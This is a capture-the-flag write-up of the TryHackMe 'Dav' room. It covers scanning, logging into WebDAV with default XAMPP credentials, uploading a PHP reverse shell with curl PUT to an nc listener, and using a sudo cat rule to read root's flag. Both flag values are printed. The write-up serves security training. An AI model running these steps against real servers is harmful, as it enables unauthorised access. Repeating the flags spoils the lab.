---
title: "Dav - TryHackMe"
author: Ludovic COULON
date: 2020-05-30
hero: ./images/hero.jpeg
excerpt: "Writeup for the Dav room on TryHackMe"
---

[TryHackMe | Dav](https://tryhackme.com/room/bsidesgtdav)

Read user.txt and root.txt

### Setup

```bash
➜  TryHackMe nmap -A -vv 10.10.33.240
```

```bash
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

```bash
➜  TryHackMe gobuster dir -u http://10.10.33.240 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.33.240
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/30 16:54:40 Starting gobuster
===============================================================
/webdav (Status: 401)
```

```bash
# There is a creds to acces the page just google webdav default creds"
http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html
user: wampp
pass: xampp
```

<div className="Image__Medium">
  <img src="https://imgur.com/BKDICjY.png" alt="blog_image" />
</div>

```bash
# Don't try to crack the hash its a rabit hole (sad life :'c)
wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
```

Let's get a reverse shell on the server ! 🤑

[Learning Pentesting with Metasploitable3: Exploiting WebDAV](https://resources.infosecinstitute.com/learning-pentesting-metasploitable3-exploiting-webdav-2/#gref)

```bash
➜  TryHackMe curl –v --user wampp:xampp http://10.10.33.240/webdav/verify.txt -X PUT
curl: (3) Failed to convert –v to ACE; string contains a disallowed character

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav/verify.txt has been created.</p>
<hr />
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.33.240 Port 80</address>
</body></html>
```

<div className="Image__Medium">
  <img src="https://imgur.com/xtdInMA.png" alt="blog_image" />
</div>

Nice, let's try with a php reverse shell shall we ? 😃

### #1 user.txt

```bash
➜  TryHackMe curl --user wampp:xampp http://10.10.33.240/webdav/reverse-shell.php --upload-file reverse-shell.php -X PUT
➜  TryHackMe nc -lvnp 4444
```

<div className="Image__Medium">
  <img src="https://imgur.com/iIe25rq.png" alt="blog_image" />
</div>

```bash
$ cd /home
$ ls
merlin
wampp
$ cd merlin
$ ls
user.txt
$ cat user.txt
449b40fe93f78a938523b7e4dcd66d2a
```

### #2 root.txt

```bash
$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
$ sudo cat /root/
cat: /root/: Is a directory
$ sudo cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5
```

<center>
  <a href="https://tryhackme.com/p/boperXD" target="_blank">
    <img src="https://i.imgur.com/GAKz5CS.png" alt="TryhackMeProfile" />
  </a>
</center>
